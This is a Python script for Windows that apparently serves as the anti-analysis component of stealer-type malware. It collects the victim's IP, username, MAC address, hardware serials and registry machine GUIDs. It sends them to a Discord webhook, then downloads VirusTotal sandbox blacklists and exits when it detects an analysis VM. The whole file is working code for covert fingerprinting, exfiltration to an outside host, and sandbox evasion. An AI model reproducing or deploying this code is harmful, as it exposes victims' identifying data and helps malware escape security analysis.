import datetime
import winreg
import os
import platform
import psutil
import re
import requests
import subprocess
import sys
import time
import uuid
import wmi
from datetime import datetime



api = "discord webhook here"



def post_message(msg):
    requests.post(api, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'},
                  data={"content": f"{msg}"})

def getip():
    ip = "None"
    try:
        ip = requests.get("https://api.ipify.org").text
    except:
        pass
    return ip


def get_guid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection, r"SOFTWARE\Microsoft\Cryptography")
        print("GUID: " + winreg.QueryValueEx(key_value, "MachineGuid")[0])
        return winreg.QueryValueEx(key_value, "MachineGuid")[0]
    except Exception as e:
        print(e)
        requests.post(f'{api}', json={'content': f"**ERROR - (Get_Guid)** `{e}`"})
        pass


def get_hwguid():
    try:
        reg_connection = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
        key_value = winreg.OpenKey(reg_connection,
                                   r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001")
        print("GUID: " + winreg.QueryValueEx(key_value, "HwProfileGuid")[0])
        return winreg.QueryValueEx(key_value, "HwProfileGuid")[0]
    except Exception as e:
        print(e)
        requests.post(f'{api}', json={'content': f"**ERROR - (Get_HWGuid)** `{e}`"})
        pass


ip = getip()
serveruser = os.getenv("UserName")
pc_name = os.getenv("COMPUTERNAME")
mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
computer = wmi.WMI()
os_info = computer.Win32_OperatingSystem()[0]
os_name = os_info.Name.encode('utf-8').split(b'|')[0]
os_name = f'{os_name}'.replace('b', ' ').replace("'", " ")
gpu = computer.Win32_VideoController()[0].Name
currentplat = os_name
hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()
current_baseboard_manufacturer = subprocess.check_output('wmic baseboard get manufacturer').decode().split('\n')[1].strip()
current_diskdrive_serial = subprocess.check_output('wmic diskdrive get serialnumber').decode().split('\n')[1].strip()
current_cpu_serial = subprocess.check_output('wmic cpu get serialnumber').decode().split('\n')[1].strip()
current_bios_serial = subprocess.check_output('wmic bios get serialnumber').decode().split('\n')[1].strip()
current_baseboard_serial = subprocess.check_output('wmic baseboard get serialnumber').decode().split('\n')[1].strip()
hwidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt')
pcnamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt')
pcusernamelist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt')
iplist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt')
maclist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt')
gpulist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/gpu_list.txt')
platformlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_platforms.txt')
bios_serial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BIOS_Serial_List.txt')
baseboardmanufacturerlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Manufacturer_List.txt')
baseboardserial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/BaseBoard_Serial_List.txt')
cpuserial_list = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/CPU_Serial_List.txt')
diskdriveserial_list = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/DiskDrive_Serial_List.txt')
hwprofileguidlist = requests.get(
    'https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/HwProfileGuid_List.txt')
machineguidlist = requests.get('https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/MachineGuid.txt')
hwguid = f'{get_hwguid()}'.replace('{', ' ').replace('}', ' ')


def pcdetect():
    requests.post(api, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36'},
                  data={"content": f"""```yaml
![PC DETECTED]!  
PC Name: {pc_name}
PC Username: {serveruser}
HWID: {hwid}
IP: {ip}
MAC: {mac}
PLATFORM: {os_name}
CPU: {computer.Win32_Processor()[0].Name}
RAM: {str(round(psutil.virtual_memory().total / (1024.0 ** 3)))} GB
GPU: {gpu}
BiosSerial: {current_bios_serial}
BaseBoardManufacturer: {current_baseboard_manufacturer}
BaseBoardSerial: {current_bios_serial}
CPUSerial: {current_cpu_serial}
DiskDriveSerial: {current_diskdrive_serial}
HWProfileGUID: {hwguid}
MachineGUID: {get_guid()}
TIME: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}```"""})


def listcheck():
    try:
        if hwid in hwidlist.text:
            post_message(f"**Blacklisted HWID Detected. HWID:** `{hwid}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if serveruser in pcusernamelist.text:
            post_message(f"**Blacklisted PC User:** `{serveruser}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if pc_name in pcnamelist.text:
            post_message(f"**Blacklisted PC Name:** `{pc_name}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if ip in iplist.text:
            post_message(f"**Blacklisted IP:** `{ip}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if mac in maclist.text:
            post_message(f"**Blacklisted MAC:** `{mac}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if gpu in gpulist.text:
            post_message(f"**Blacklisted GPU:** `{gpu}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if current_diskdrive_serial in diskdriveserial_list:
            post_message(f"**Blacklisted DiskDriveSerial:** `{current_diskdrive_serial}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR - DiskDrive]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if current_cpu_serial in cpuserial_list:
            post_message(f"**Blacklisted CPUSerial:** `{current_cpu_serial}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR - CPUSerial]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if current_baseboard_manufacturer in baseboardmanufacturerlist:
            post_message(f"**Blacklisted BaseBoardManufacturer:** `{current_baseboard_manufacturer}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR - BaseBoardManufacturer]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if current_bios_serial in bios_serial_list:
            post_message(f"**Blacklisted BiosSerial:** `{current_bios_serial}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR - BiosSerial]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if current_baseboard_serial in baseboardserial_list:
            post_message(f"**Blacklisted BaseBoardSerial:** `{current_baseboard_serial}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR - BaseBoardSerial]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if get_guid() in machineguidlist:
            post_message(f"**Blacklisted MachineGUID:** `{get_guid()}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR - MachineGUID]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)

    try:
        if hwguid in hwprofileguidlist:
            post_message(f"**Blacklisted MachineHWGUID:** `{hwguid}`")
            time.sleep(2)
            os._exit(1)
    except:
        post_message('[ERROR - MachineHWGUID]: Failed to connect to database.')
        time.sleep(2)
        os._exit(1)


pcdetect()  # PCDETECT
listcheck()  # LISTCHECK
